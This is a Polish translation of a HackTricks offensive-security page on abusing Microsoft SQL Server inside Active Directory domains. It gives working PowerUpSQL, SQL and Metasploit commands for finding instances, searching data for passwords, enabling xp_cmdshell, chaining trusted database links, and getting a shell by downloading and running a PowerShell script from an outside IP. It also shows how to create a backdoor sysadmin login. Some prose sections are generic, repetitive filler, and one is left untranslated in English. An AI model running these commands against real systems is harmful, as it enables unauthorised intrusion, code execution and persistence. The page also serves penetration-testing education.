# Wykorzystywanie MSSQL w AD

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Eksploracja / Odkrywanie MSSQL**

Moduł PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) jest bardzo przydatny w tym przypadku.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Wyliczanie z sieci bez sesji domenowej

To enumerate from the network without a domain session, you can use the following techniques:

1. **Port scanning**: Use tools like Nmap to scan the network for open ports on the target machine. Look for ports commonly used by Active Directory (AD) and Microsoft SQL Server (MSSQL), such as 389 (LDAP), 445 (SMB), and 1433 (MSSQL).

2. **Service enumeration**: Once you have identified open ports, use tools like enum4linux or smbmap to enumerate services running on those ports. These tools can provide valuable information about the target system, including user accounts, group memberships, and shared resources.

3. **LDAP enumeration**: If port 389 (LDAP) is open, you can use tools like ldapsearch or ADExplorer to query the AD server for information. This can include details about users, groups, organizational units, and more.

4. **SMB enumeration**: If port 445 (SMB) is open, you can use tools like smbclient or CrackMapExec to enumerate shares, access files, and gather information about the target system.

5. **MSSQL enumeration**: If port 1433 (MSSQL) is open, you can use tools like sqlmap or Metasploit to enumerate databases, tables, and columns, as well as extract data from the MSSQL server.

Remember to always perform these enumeration techniques within the boundaries of legal and authorized penetration testing.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Wyliczanie z wnętrza domeny

W przypadku, gdy już uzyskamy dostęp do wewnętrznej sieci domeny, możemy przystąpić do wyliczania informacji na temat systemu Active Directory (AD) oraz baz danych Microsoft SQL Server (MSSQL). Poniżej przedstawiam kilka technik, które można zastosować w celu wykorzystania AD i MSSQL.

#### Wykorzystywanie AD

1. **Wykorzystywanie usług AD**: Sprawdzamy, jakie usługi są dostępne w AD, takie jak DNS, DHCP, LDAP, Kerberos itp. Możemy wykorzystać te usługi do zdobycia informacji o domenie.

2. **Wykorzystywanie kont użytkowników**: Przeprowadzamy analizę kont użytkowników w celu znalezienia kont z nadmiernymi uprawnieniami lub słabymi hasłami. Możemy również sprawdzić, czy istnieją konta usunięte, które nadal mają dostęp do zasobów.

3. **Wykorzystywanie grup**: Analizujemy grupy w AD w celu znalezienia grup z nadmiernymi uprawnieniami lub grup, które mogą być wykorzystane do eskalacji uprawnień.

4. **Wykorzystywanie uprawnień**: Sprawdzamy, jakie uprawnienia mają konta użytkowników w AD. Możemy znaleźć konta z nadmiernymi uprawnieniami, które mogą być wykorzystane do uzyskania dostępu do innych zasobów.

#### Wykorzystywanie MSSQL

1. **Wykorzystywanie informacji o serwerze**: Sprawdzamy informacje o serwerze MSSQL, takie jak wersja, nazwa instancji, konfiguracja itp. Te informacje mogą pomóc nam w identyfikacji potencjalnych podatności.

2. **Wykorzystywanie kont użytkowników**: Analizujemy konta użytkowników w bazie danych MSSQL w celu znalezienia kont z nadmiernymi uprawnieniami lub słabymi hasłami.

3. **Wykorzystywanie procedur składowanych**: Sprawdzamy, czy istnieją procedury składowane, które mogą być wykorzystane do wykonania kodu na serwerze MSSQL.

4. **Wykorzystywanie podatności**: Szukamy znanych podatności w serwerze MSSQL i wykorzystujemy je do uzyskania dostępu do danych lub eskalacji uprawnień.

Pamiętaj, że przed przystąpieniem do wykorzystywania AD i MSSQL należy uzyskać odpowiednie uprawnienia i przestrzegać prawnych i etycznych zasad.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
### Dostęp do bazy danych MSSQL

#### 1. Wykorzystanie błędów w konfiguracji

W przypadku, gdy baza danych MSSQL jest źle skonfigurowana, istnieje możliwość uzyskania dostępu do niej. Oto kilka potencjalnych błędów konfiguracyjnych, które można wykorzystać:

- Używanie słabych lub domyślnych haseł dla konta administratora bazy danych.
- Brak zabezpieczeń sieciowych, takich jak firewall, które umożliwiają zdalny dostęp do bazy danych.
- Niewłaściwe uprawnienia dla kont użytkowników, które umożliwiają wykonanie nieautoryzowanych operacji.

#### 2. Wykorzystanie podatności

MSSQL może mieć różne podatności, które można wykorzystać do uzyskania dostępu do bazy danych. Oto kilka przykładów popularnych podatności:

- SQL Injection: Wykorzystanie nieodpowiednio zabezpieczonych zapytań SQL, aby wykonać nieautoryzowane operacje na bazie danych.
- Remote Code Execution (RCE): Wykorzystanie podatności, która umożliwia wykonanie kodu na serwerze bazy danych.
- Uzyskanie dostępu do konta administratora bazy danych poprzez podatność w mechanizmach uwierzytelniania.

#### 3. Wykorzystanie słabych haseł

Często administratorzy bazy danych używają słabych haseł, co ułatwia uzyskanie dostępu do bazy danych. Można wykorzystać różne techniki, takie jak brute force lub słownikowe ataki, aby złamać hasło i uzyskać dostęp.

#### 4. Wykorzystanie słabych zabezpieczeń sieciowych

Jeśli baza danych MSSQL jest źle zabezpieczona na poziomie sieciowym, można wykorzystać różne techniki, takie jak sniffing sieciowy, aby przechwycić dane uwierzytelniające i uzyskać dostęp do bazy danych.

#### 5. Wykorzystanie błędów w aplikacjach korzystających z bazy danych

Jeśli aplikacje korzystające z bazy danych MSSQL mają błędy w implementacji, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to nieodpowiednie sprawdzanie uprawnień użytkownika, niewłaściwe filtrowanie danych wejściowych itp.

#### 6. Wykorzystanie słabych uprawnień użytkowników

Jeśli użytkownicy mają nadmiarowe uprawnienia w bazie danych MSSQL, można wykorzystać te uprawnienia, aby uzyskać dostęp do danych lub wykonać nieautoryzowane operacje. Należy sprawdzić, czy istnieją konta użytkowników z nadmiarowymi uprawnieniami i wykorzystać je do uzyskania dostępu.

#### 7. Wykorzystanie błędów w mechanizmach uwierzytelniania

Jeśli mechanizmy uwierzytelniania w bazie danych MSSQL mają błędy, można je wykorzystać do uzyskania dostępu. Przykłady takich błędów to podatności w protokole uwierzytelniania, nieodpowiednie sprawdzanie tożsamości użytkownika itp.

#### 8. Wykorzystanie błędów w konfiguracji serwera

Jeśli serwer MSSQL jest źle skonfigurowany, można wykorzystać różne błędy konfiguracyjne, takie jak niewłaściwe ustawienia uprawnień, aby uzyskać dostęp do bazy danych.

#### 9. Wykorzystanie błędów w procedurach składowanych

Jeśli w bazie danych MSSQL istnieją procedury składowane z błędami, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to nieodpowiednie sprawdzanie uprawnień, niewłaściwe filtrowanie danych itp.

#### 10. Wykorzystanie błędów w konfiguracji aplikacji

Jeśli aplikacje korzystające z bazy danych MSSQL mają błędy w konfiguracji, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to niewłaściwe ustawienia uprawnień, nieodpowiednie filtrowanie danych wejściowych itp.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Możliwe jest również **wykonanie poleceń** wewnątrz hosta MSSQL
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Sprawdź na stronie wymienionej w **następnym rozdziale, jak to zrobić ręcznie**.

### Podstawowe triki hakowania MSSQL

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Zaufane linki MSSQL

Jeśli instancja MSSQL jest zaufana (link bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **użyć relacji zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łańcuchowe, a w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.

**Linki między bazami danych działają nawet w przypadku zaufania między lasami.**

### Nadużycie Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Możesz łatwo sprawdzić zaufane linki za pomocą metasploita.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Zauważ, że metasploit będzie próbował wykorzystać tylko funkcję `openquery()` w MSSQL (więc jeśli nie możesz wykonać polecenia za pomocą `openquery()`, będziesz musiał spróbować metody `EXECUTE` **ręcznie** w celu wykonania poleceń, zobacz więcej poniżej.)

### Ręczne - Openquery()

Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py.**

Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie za pomocą **klienta MSSQL, takiego jak** [**HeidiSQL**](https://www.heidisql.com)

_Zaloguj się za pomocą uwierzytelniania systemu Windows:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Znajdź zaufane linki
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Wykonaj zapytania w zaufanym linku

Wykonaj zapytania za pomocą linku (przykład: znajdź więcej linków w nowo dostępnym egzemplarzu):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Sprawdź, gdzie używane są cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Możesz kontynuować tę łańcuch zaufanych linków w nieskończoność ręcznie.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Jeśli nie możesz wykonywać działań takich jak `exec xp_cmdshell` z `openquery()`, spróbuj zastosować metodę `EXECUTE`.

### Instrukcja - EXECUTE

Możesz również nadużywać zaufanych linków za pomocą metody `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Podwyższanie uprawnień lokalnych

Lokalny użytkownik **MSSQL** zazwyczaj posiada specjalny rodzaj uprawnienia o nazwie **`SeImpersonatePrivilege`**. Pozwala to na "udawanie klienta po uwierzytelnieniu".

Strategią, którą wielu autorów opracowało, jest zmuszenie usługi **SYSTEM** do uwierzytelnienia się w fałszywej usłudze lub usłudze typu man-in-the-middle, którą tworzy atakujący. Ta fałszywa usługa jest w stanie udawać usługę **SYSTEM**, podczas gdy ta próbuje się uwierzytelnić.

[SweetPotato](https://github.com/CCob/SweetPotato) zawiera kolekcję różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w narzędziu Beacon.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć reklamę swojej **firmy na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy Telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
